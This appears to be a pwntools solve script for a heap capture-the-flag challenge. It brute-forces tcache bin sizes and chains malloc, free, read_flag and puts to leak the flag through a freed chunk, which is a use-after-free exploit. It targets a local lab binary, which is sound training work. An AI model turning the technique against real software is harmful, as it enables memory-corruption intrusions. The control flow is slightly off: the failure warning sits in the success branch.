from pwn import *
from ctypes import *

import re

context(log_level="info")


def launch():
    global io
    io = process("./freebin-feint-easy")


def malloc(size: int):
    io.recvuntil(b"):")
    io.sendline(b"malloc")
    io.recvuntil(b"Size:")
    io.sendline(str(size).encode())


def free():
    io.recvuntil(b"):")
    io.sendline(b"free")


def puts():
    io.recvuntil(b"):")
    io.sendline(b"puts")


def read_flag():
    io.recvuntil(b"):")
    io.sendline(b"read_flag")


def test(target: int):
    launch()
    malloc(target)
    free()
    read_flag()
    puts()

    response = io.recvall(timeout=0.01)
    if b"flag{" in response:
        print(
            re.search(rb"flag\{[^}]*\}", response)
            .group(0)  ## pyright: ignore[reportOptionalMemberAccess]
            .decode()
        )
        io.close()
        return True
    return False


def main():
    for bin in range(0x20, 0x410 + 1, 0x10):
        base_req = bin - 0x10
        if test(base_req):
            log.success(
                f"Found working requested size: {hex(base_req)} for tcache bin {hex(bin)}"
            )
            return log.warning("Exhausted candidates, none matched.")
    io.interactive()


if __name__ == "__main__":
    main()
